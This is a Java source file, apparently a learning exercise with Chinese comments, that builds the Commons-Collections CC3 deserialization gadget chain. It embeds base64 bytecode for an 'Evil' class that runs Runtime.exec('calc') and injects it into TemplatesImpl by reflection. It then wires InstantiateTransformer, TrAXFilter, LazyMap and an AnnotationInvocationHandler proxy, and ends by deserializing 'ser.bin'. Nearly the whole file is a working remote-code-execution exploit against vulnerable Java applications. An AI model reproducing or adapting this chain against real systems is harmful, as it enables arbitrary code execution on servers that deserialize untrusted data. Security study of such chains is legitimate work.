package test;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.Templates;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

import static test.cc1.serialize;
import static test.cc1.unserialize;

public class cc3 {
    public static void main(String[] args) throws Exception{
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAbAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBAAlFdmlsLmphdmEMAAcACAcAHAwAHQAeAQAEY2FsYwwAHwAgAQAOY2xhc3Nsb2FkL0V2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAALAAQADAANAA0ACwAAAAQAAQAMAAEADQAOAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAARAAsAAAAEAAEADwABAA0AEAACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAFQALAAAABAABAA8AAQARAAAAAgAS");

        TemplatesImpl templates = new TemplatesImpl();
        Class tc = templates.getClass();


        //

        Field bytecodesField = tc.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte codes[][] = {code};
        bytecodesField.set(templates,codes);

        Field nameField = tc.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"aaa");


        Field tfactoryField = tc.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates,new TransformerFactoryImpl());
        //templates.newTransformer();

        /***
         * 链条1 InvokerTransformer
         */
//        Transformer[] transformers = new Transformer[] {
//                new ConstantTransformer(templates),
//                new InvokerTransformer("newTransformer", null, null)
//        };
//
//        //将transformers数组存入ChaniedTransformer这个继承类
//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        /****
         * 链条2 InstantiateTransformer
         */




        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})
        };
        //将transformers数组存入ChaniedTransformer这个继承类
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);


        HashMap <Object,Object> map = new HashMap<>();
        LazyMap lazymap = (LazyMap) LazyMap.decorate(map,chainedTransformer);
        Constructor handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
        handler_constructor.setAccessible(true);
        // 创建一个与代理对象相关联的InvocationHandler
        InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,lazymap);
        // 创建代理对象proxy_map来代理map，代理对象执行的所有方法都会替换执行InvocationHandler中的invoke方法
        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},map_handler);


        Constructor AnnotationInvocationHandler_Constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
        AnnotationInvocationHandler_Constructor.setAccessible(true);
        Object o = AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);
        //serialize(o);
        unserialize("ser.bin");

    }

}
